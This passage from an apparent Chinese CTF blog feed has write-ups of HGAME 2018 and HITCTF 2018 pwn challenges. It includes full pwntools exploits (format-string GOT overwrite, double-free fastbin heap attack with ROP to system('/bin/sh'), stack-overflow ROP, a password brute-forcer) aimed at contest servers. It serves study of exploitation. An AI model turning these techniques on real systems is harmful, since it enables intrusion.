; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a8f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400640 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000004009dd : pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a93 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a91 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a8d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400541 : ret</span></span><br><span class="line"><span class="string">0x0000000000400980 : ret 0x458b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="base64-decoder"><a href="#base64-decoder" class="headerlink" title="base64_decoder"></a>base64_decoder</h2><p>题目是一个base64解码器，将用户输入的字符串经过base64解码，然后打印出来。</p><p><img src="/img/hgame2018/4_2_1.png" alt=""></p><p>存在一个明显的格式化字符串漏洞，并且字符串漏洞在栈上，可以对内存地址任意写。</p><p>起初以为很简单，直接使用了之前给的libc文件，却发现怎么搞也搞不通，猜测是libc被替换了，学习使用了libc database，找到了题目使用的libc——libc6-i386_2.19-0ubuntu6.14_amd64.so。</p><p>可以参考置顶日志的libc database使用方法</p><p>最终利用system替换strcmp执行system(‘/bin/sh’)，解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">%7$p  offset</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time,base64</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./base64_decoder'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./base64_decoder'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x8048945'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span>,<span class="number">10013</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc6-i386_2.19-0ubuntu6.14_amd64.so'</span>)</span><br><span class="line"><span class="comment">#base64.b64encode(s, altchars=None) </span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(base64.b64encode(<span class="string">'%2$p'</span>))</span><br><span class="line">heap_addr = p.recvline()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] heap addr:'</span>,heap_addr</span><br><span class="line">heap_addr_int = int(heap_addr[<span class="number">3</span>:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] heap addr:'</span>,hex(heap_addr_int)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">fmt = p32(heap_addr_int<span class="number">-0x110</span>)+<span class="string">"%%%dc%%%d$hhn"</span>%(<span class="number">200</span>,<span class="number">7</span>)</span><br><span class="line">p.sendline(base64.b64encode(fmt))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">fmt = p32(elf.got[<span class="string">'printf'</span>])+<span class="string">"%7$s"</span></span><br><span class="line">p.sendline(base64.b64encode(fmt))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'\x08'</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] printf addr:'</span>,hex(printf_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">fmt = p32(elf.got[<span class="string">'puts'</span>])+<span class="string">"%7$s"</span></span><br><span class="line">p.sendline(base64.b64encode(fmt))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'\x08'</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] puts addr:'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system addr:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">target = libc.symbols[<span class="string">'system'</span>] <span class="comment">#</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] strcmp@got: '</span>,hex(elf.got[<span class="string">'strcmp'</span>])</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">fmt = fmtstr_payload(<span class="number">7</span>, &#123;elf.got[<span class="string">'strcmp'</span>]: target&#125;, write_size=<span class="string">'byte'</span>)</span><br><span class="line">p.sendline(base64.b64encode(fmt))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="hacker-system-ver3"><a href="#hacker-system-ver3" class="headerlink" title="hacker_system_ver3"></a>hacker_system_ver3</h2><p>函数维护了一个bss段上的结构体数组，其每一个结构体的大小是0x38，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0x00 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">   | length     |     name 1     | </span><br><span class="line">0x10 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">     | name 2     |     name 3     | </span><br><span class="line">0x20 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">     | name 4     |       age      | </span><br><span class="line">0x30 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">     | intr addr  |                </span><br><span class="line">0x38 +-+-+-+-+-+-+-</span><br></pre></td></tr></table></figure><p>其漏洞在于删除函数中，利用name寻址，将intr address释放后，再释放该结构体，最终将数组的该位置置空。</p><p><img src="/img/hgame2018/4_4_1.png" alt=""></p><p>但问题在于，当出现name相同的结构体时，仅置空了最后一个数组的指针，造成之前的指针均为悬垂指针，进而造成double free漏洞。</p><p>该double free漏洞可以控制任意大小的fastbin，原因是，在add 功能时，可以add任意大小的内存块。</p><p>这里采用了bluecake@dubhe大佬的fastbin利用方法。</p><p>劫持两个fastbin的链来构造新的fake bin块。最终覆写top地址，将top地址覆写为不存在canary保护的函数栈上，再申请堆块是，会把栈地址分配给用户，进一步可以写rop，劫持控制流，拿到shell。</p><p>解题的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import time,base64</span></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver3'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./hacker_system_ver3'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)#,'b*0x0400F6D'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span>,<span class="number">10014</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,age,length,intro)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">'age:'</span>)</span><br><span class="line">p.sendline(str(age))</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">p.sendline(intro)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_user</span><span class="params">(name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_user</span><span class="params">(name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step 1 leak libc</span></span><br><span class="line">add(<span class="string">'step1\n'</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step1\n'</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'step1'</span>)</span><br><span class="line">add(<span class="string">'nop1\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,p64(<span class="number">0x18</span>)+<span class="string">'1'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">3</span>)+p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line">print_user(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr :'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system addr :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="comment">#step 2 leak steak</span></span><br><span class="line">add(<span class="string">'step2\n'</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step2\n'</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'step2'</span>)</span><br><span class="line">add(<span class="string">'nop2\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,p64(<span class="number">0x18</span>)+<span class="string">'2'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">3</span>)+p64(libc.symbols[<span class="string">'environ'</span>]))</span><br><span class="line">print_user(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]stack addr :'</span>,hex(stack_addr)</span><br><span class="line">stack_offset =<span class="number">0x7ffd3af20438</span><span class="number">-0x7ffd3af20330</span></span><br><span class="line"><span class="comment">#add('padding\n',18,0x138,'hack by p4nda')</span></span><br><span class="line"><span class="comment">#delete_user('nop2')</span></span><br><span class="line"><span class="comment">#delete_user('2')</span></span><br><span class="line"><span class="comment">#delete_user()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">add('padding_3\n',18,0x20,'hack by p4nda')</span></span><br><span class="line"><span class="string">add('step3\n',18,0x20,'hack by p4nda')</span></span><br><span class="line"><span class="string">add('step3\n',18,0x20,'hack by p4nda')</span></span><br><span class="line"><span class="string">delete_user('step3')</span></span><br><span class="line"><span class="string">add('nop3\n',18,0x38,p64(0x18)+'3'.ljust(0x20,'\0')+p64(3)+p64(0))</span></span><br><span class="line"><span class="string">delete_user('nop3')</span></span><br><span class="line"><span class="string">delete_user('3')</span></span><br><span class="line"><span class="string">delete_user('padding_3')</span></span><br><span class="line"><span class="string">add('ctrl3\n',18,0x38,p64(0xdeadbeef))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'step3'</span>)</span><br><span class="line">delete_user(<span class="string">'step3'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]stack addr :'</span>,hex(stack_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400a0f')</span></span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">0</span>,<span class="number">0x70</span>,p64(<span class="number">0x61</span>))</span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">18</span>,<span class="number">0x70</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'step4'</span>)</span><br><span class="line">delete_user(<span class="string">'step4'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400a0f')</span></span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,p64(libc.symbols[<span class="string">'__malloc_hook'</span>]+<span class="number">0x10</span>+<span class="number">0x08</span>*<span class="number">6</span>))</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'padding\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'padding\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'padding\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'padding\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'padding'</span>)</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stack_addr-stack_offset<span class="number">-0x8</span>))</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x40</span>,p64(<span class="number">0x0000000000401053</span>)+p64(next(libc.search(<span class="string">'/bin/sh'</span>)))+p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment">#add('step3\n',18,0x60,'a'*0x40)</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x000000000040104c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040104e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401050 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401052 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040104b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040104f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400870 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401053 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401051 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040104d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400709 : ret</span></span><br><span class="line"><span class="string">0x0000000000400782 : ret 0x2018</span></span><br><span class="line"><span class="string">0x0000000000400abd : ret 0x8b48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;HGAME 2018是由杭电的Vidar-Team举办的校内赛，历时一个月，记录一下其中的PWN题目。&lt;/p&gt;
&lt;h1 id=&quot;LEVEL-WEEK-1&quot;&gt;&lt;a href=&quot;#LEVEL-WEEK-1&quot; class=&quot;headerlink&quot; title=&quot;LEVEL - W
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>问题解决及工具使用</title>
    <link href="http://p4nda.top/2018/03/03/question/"/>
    <id>http://p4nda.top/2018/03/03/question/</id>
    <published>2018-03-02T16:00:00.000Z</published>
    <updated>2018-03-03T11:47:31.789Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些工具的使用方法和遇到的问题解决途径</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一些工具的使用方法和遇到的问题解决途径&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="Questions" scheme="http://p4nda.top/tags/Questions/"/>
    
  </entry>
  
  <entry>
    <title>HITCTF 2018 PWN 题记录</title>
    <link href="http://p4nda.top/2018/02/05/hitctf/"/>
    <id>http://p4nda.top/2018/02/05/hitctf/</id>
    <published>2018-02-04T16:34:14.000Z</published>
    <updated>2018-02-02T17:05:49.945Z</updated>
    
    <content type="html"><![CDATA[<p>HITCTF是哈尔滨工业大学组织的一场校赛，在假期时间看了一下题目，锻炼一下，以此记录。</p><p><img src="/img/HITCTF/logo.png" alt=""></p><p>本次比赛共有五道PWN题：</p><ul><li>stackoverflow （栈溢出）</li><li>login（爆破）</li><li>DragonBall（整数溢出）</li><li>nodes（溢出BSS段，影响程序逻辑）</li><li>babynote（UAF）</li></ul><hr><h1 id="stackoverflow"><a href="#stackoverflow" class="headerlink" title="stackoverflow"></a>stackoverflow</h1><p>此题目是PWN题的签到题，函数逻辑简单，在主函数调用的vuln函数中存在明显的栈溢出漏洞</p><p><img src="/img/HITCTF/pwn_1_1.png" alt=""></p><p>可以溢出覆盖0x18个字节，并且没有开启canary保护， 可以利用ROP技术控制执行流</p><p><img src="/img/HITCTF/pwn_1_3.png" alt=""></p><p>如程序中存在一个flag函数，可以直接获取flag</p><p><img src="/img/HITCTF/pwn_1_2.png" alt=""></p><p>exp.py脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug =<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./stackoverflow'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./stackoverflow'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.132.82'</span>,<span class="number">40000</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to pwn world!\nLeave your name:'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x28</span>+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0x80485df</span>)+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0xc0ffee</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><p>此题的整体代码逻辑很清晰，首先登录一次，然后再过一次check，就可以直接得到flag</p><p><img src="/img/HITCTF/pwn_2_1.png" alt=""></p><p>对比两个用户名密码的check函数可以发现其中的不同：</p><p><img src="/img/HITCTF/pwn_2_2.png" alt=""></p><p><img src="/img/HITCTF/pwn_2_3.png" alt=""></p><p>很明显发现其不同点在于strncmp的参数上，第一个函数参数长度是用户输入的长度，第二次是固定的长度。此时可以发现两个hint。</p><ol><li>password的长度是0x20（抖机灵）</li><li>由于password是固定的，因此可以通过爆破的方法来验证，每次爆破一位不断叠加，即可得到其真实密码。</li></ol><p>爆破的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">10_adhUNwj_qidACn_qdXon912_uhdq6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./login'</span>)</span><br><span class="line">    <span class="comment">#libc = ELF('./libc.local.so')</span></span><br><span class="line">    <span class="comment">#off = 0x001b2000</span></span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40001</span>)</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    <span class="comment">#libc = ELF('./libc_32.so.6')</span></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line">dic = range(<span class="number">33</span>,<span class="number">127</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(j)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'password'</span> + chr(j)</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        p = process(<span class="string">'./login'</span>)</span><br><span class="line">        context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40001</span>)</span><br><span class="line">        <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    p.recvuntil(<span class="string">'Username:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'root'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Password: '</span>)</span><br><span class="line">    p.sendline(password+chr(j))</span><br><span class="line">    a = p.recvline()</span><br><span class="line">    <span class="keyword">print</span> a </span><br><span class="line">    <span class="keyword">if</span> <span class="string">'successful'</span> <span class="keyword">in</span> a:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> chr(j)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'00'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x20</span>):</span><br><span class="line">        pro = 